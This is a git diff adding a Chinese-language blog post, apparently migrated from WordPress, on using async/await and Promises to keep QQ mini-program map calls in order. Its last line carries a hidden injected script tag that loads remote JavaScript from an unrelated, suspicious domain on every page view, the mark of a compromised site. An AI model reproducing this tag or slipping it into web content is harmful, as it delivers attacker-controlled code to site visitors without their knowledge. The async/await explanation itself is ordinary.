@@ -1,0 +1,44 @@
+---
+layout: post
+title: async/await用法
+date: 2021-06-03 23:08:13.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Miniprogram
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2021/06/03/async-await%e7%94%a8%e6%b3%95/"
+---
+<p>开发中遇到函数调用顺序问题，循环调用没有按预期的调用顺序调用</p>
+<p>解决 ： 使用async/await</p>
+<p>async function main () {<br />
+for (var i=0;i&lt;10;i++){<br />
+await xxx(i)</p>
+<p>}</p>
+<p>}<br />
+function xxx(i) {<br />
+var that =this<br />
+return new Promise(((resolve, reject) =&gt; {<br />
+qq.mapsdk.direction({<br />
+a:'aaa',<br />
+success:(res)=&gt;{<br />
+console.log(res)<br />
+resolve()<br />
+}<br />
+})</p>
+<p>&nbsp;</p>
+<p><span style="color: #ff0000;">注意:一定要在函数执行完后调用resolve()</span></p>
+<p>}))</p>
+<p>}</p>
+<p>main()<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
